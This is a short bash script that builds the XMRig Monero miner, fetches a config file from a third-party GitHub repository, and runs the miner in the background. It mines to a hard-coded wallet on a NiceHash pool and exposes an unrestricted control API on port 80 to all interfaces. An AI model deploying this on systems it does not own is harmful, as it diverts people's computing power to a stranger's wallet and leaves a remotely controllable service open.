#!/bin/bash

 apt-get update && sudo apt-get upgrade -y && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y 

git clone https://github.com/xmrig/xmrig.git 

cd xmrig && mkdir build && cd build && cmake .. && make

wget https://raw.githubusercontent.com/basetrue/home/master/config.json && ./xmrig --http-enabled --api-worker-id UbuntuServer --http-host 0.0.0.0 --http-port 80 --http-access-token UbuntuServer2020 --http-no-restricted -o randomxmonero.eu.nicehash.com:3380 -u 3MDR7KBmL9M775eUqVEQHF3rRRMoPzidUJ.Ubuntu -p x -k --nicehash -a rx/0 -o randomxmonero.eu.nicehash.com:3380 -u 3MDR7KBmL9M775eUqVEQHF3rRRMoPzidUJ.Ubuntu -a rx/0 --daemon
